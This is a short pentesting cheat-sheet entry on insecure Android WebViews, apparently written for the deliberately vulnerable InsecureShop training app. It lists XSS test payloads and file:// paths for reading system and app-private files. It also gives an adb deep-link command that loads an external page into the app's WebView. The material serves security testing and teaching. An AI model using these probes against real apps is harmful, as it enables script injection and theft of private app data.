---
title: Insecure WebView
category: android
subcategory: sub-06
os: linux, windows
command: adb shell am start -W -a android.intent.action.VIEW -d "insecureshop://com.insecureshop/web?url=http://192.168.1.14:9090/test.html"
tools: adb
---


### Threats

- JavaScript enabled: `setJavaScriptEnabled(true)`
- File access: `file:///`
- JavaScript Interface: `addJavascriptInterface()`
- No URL validation
- Debugging enabled in production

### XSS Test

```bash
javascript:alert("XSS Detected!")
```

```html
<script>alert('XSS')</script>
<script>alert(1)</script>
```

### File access test

```bash
file:///etc/hosts
file:///data/data/com.package.name/
```

### Exploit via Deep Link

```bash
adb shell am start -W -a android.intent.action.VIEW -d "insecureshop://com.insecureshop/web?url=http://192.168.1.14:9090/test.html"
```
